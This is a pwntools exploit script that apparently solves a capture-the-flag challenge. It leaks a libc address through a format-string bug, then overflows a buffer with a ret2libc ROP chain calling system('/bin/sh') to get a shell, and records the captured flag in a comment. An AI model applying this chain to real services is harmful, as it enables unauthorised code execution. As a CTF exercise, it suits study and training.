from pwn import *

elf = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("localhost", 9999)

# Find libc base address:
OFFSET = 56
p.sendline(b"2")
p.sendline(b"%3$p")
p.recvuntil(b"Response:")
p.recvline()
libc.address = int(p.recvline().strip().decode()[2::], 16) - libc.symbols['write'] - 0x14

rop = ROP(libc)
print("LIBC ADDR: ", hex(libc.address))

p.sendline(b"2")

# Get the shellll!!
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
binsh = next(libc.search(b"/bin/sh\x00"))
ret = rop.find_gadget(["ret"])[0] 
system = libc.symbols['system']

PAYLOAD = b"A" * OFFSET + flat(pop_rdi, binsh, ret, system)
p.sendline(PAYLOAD)
p.interactive()

# flag: pearl{fin4lly_g0t_my_fl4g_th4nks_printf}
